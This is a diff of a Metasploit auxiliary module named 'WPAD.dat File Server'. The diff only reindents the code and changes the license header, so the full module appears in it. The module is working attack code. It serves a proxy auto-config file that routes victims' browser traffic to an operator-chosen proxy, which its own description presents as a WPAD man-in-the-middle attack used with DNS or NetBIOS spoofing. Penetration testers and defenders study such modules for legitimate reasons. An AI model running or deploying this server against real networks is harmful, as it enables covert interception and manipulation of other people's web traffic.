@@ -1,62 +1,60 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpServer::HTML
-	include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Auxiliary::Report
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'        => 'WPAD.dat File Server',
-			'Description' => %q{
-					This module generates a valid wpad.dat file for WPAD mitm
-				attacks. Usually this module is used in combination with DNS attacks
-				or the 'NetBIOS Name Service Spoofer' module. Please remember as the
-				server will be running by default on TCP port 80 you will need the
-				required privileges to open that port.
-			},
-			'Author'      =>
-				[
-					'et'            # Metasploit module
-				],
-			'License'     => MSF_LICENSE,
-			'DefaultOptions' =>
-				{
-					'SRVPORT' => 80
-				},
-			'Passive' => true))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'WPAD.dat File Server',
+      'Description' => %q{
+          This module generates a valid wpad.dat file for WPAD mitm
+        attacks. Usually this module is used in combination with DNS attacks
+        or the 'NetBIOS Name Service Spoofer' module. Please remember as the
+        server will be running by default on TCP port 80 you will need the
+        required privileges to open that port.
+      },
+      'Author'      =>
+        [
+          'et'            # Metasploit module
+        ],
+      'License'     => MSF_LICENSE,
+      'DefaultOptions' =>
+        {
+          'SRVPORT' => 80
+        },
+      'Passive' => true))
 
-		register_options(
-			[
-				OptEnum.new('TYPE', [true, 'WPAD/PAC Data File', 'DAT', ['DAT', 'PAC']]),
-				OptAddress.new('EXCLUDENETWORK', [ true, "Network to exclude",'127.0.0.1' ]),
-				OptAddress.new('EXCLUDENETMASK', [ true, "Netmask to exclude",'255.255.255.0' ]),
-				OptAddress.new('PROXY', [ true, "Proxy to redirect traffic to", '0.0.0.0' ]),
-				OptPort.new('PROXYPORT',[ true, "Proxy port", 8080 ])
-			], self.class)
+    register_options(
+      [
+        OptEnum.new('TYPE', [true, 'WPAD/PAC Data File', 'DAT', ['DAT', 'PAC']]),
+        OptAddress.new('EXCLUDENETWORK', [ true, "Network to exclude",'127.0.0.1' ]),
+        OptAddress.new('EXCLUDENETMASK', [ true, "Netmask to exclude",'255.255.255.0' ]),
+        OptAddress.new('PROXY', [ true, "Proxy to redirect traffic to", '0.0.0.0' ]),
+        OptPort.new('PROXYPORT',[ true, "Proxy port", 8080 ])
+      ], self.class)
 
-		deregister_options('URIPATH')
-	end
-
-
-	def cleanup
-		datastore['URIPATH'] = @previous_uri
-	end
+    deregister_options('URIPATH')
+  end
 
 
-	def on_request_uri(cli, request)
-		print_status("Request '#{request.method} #{request.headers['user-agent']}")
+  def cleanup
+    datastore['URIPATH'] = @previous_uri
+  end
 
-		return if request.method == "POST"
 
-		html = <<-EOS
+  def on_request_uri(cli, request)
+    print_status("Request '#{request.method} #{request.headers['user-agent']}")
+
+    return if request.method == "POST"
+
+    html = <<-EOS
 function FindProxyForURL(url, host) {
       // URLs within this network are accessed directly
       if (isInNet(host, "#{datastore['EXCLUDENETWORK']}", "#{datastore['EXCLUDENETMASK']}"))
@@ -67,30 +65,30 @@ function FindProxyForURL(url, host) {
    }
 EOS
 
-		print_status("Sending WPAD config ...")
-		send_response_html(cli, html,
-			{
-				'Content-Type' => 'application/x-ns-proxy-autoconfig'
-			})
-	end
+    print_status("Sending WPAD config ...")
+    send_response_html(cli, html,
+      {
+        'Content-Type' => 'application/x-ns-proxy-autoconfig'
+      })
+  end
 
 
-	def run
-		@previous_uri = datastore['URIPATH']
-		datastore['URIPATH'] = (datastore['TYPE'] == 'DAT') ? 'wpad.dat' : 'proxy.pac'
+  def run
+    @previous_uri = datastore['URIPATH']
+    datastore['URIPATH'] = (datastore['TYPE'] == 'DAT') ? 'wpad.dat' : 'proxy.pac'
 
-		print_status("Serving #{datastore['URIPATH']} on port #{datastore['SRVPORT']}")
+    print_status("Serving #{datastore['URIPATH']} on port #{datastore['SRVPORT']}")
 
-		begin
-			exploit
-		rescue Errno::EACCES => e
-			if e.message =~ /Permission denied - bind/
-				print_error("You need to have permission to bind to #{datastore['SRVPORT']}")
-			else
-				raise e
-			end
-		end
-	end
+    begin
+      exploit
+    rescue Errno::EACCES => e
+      if e.message =~ /Permission denied - bind/
+        print_error("You need to have permission to bind to #{datastore['SRVPORT']}")
+      else
+        raise e
+      end
+    end
+  end
 
 end
 
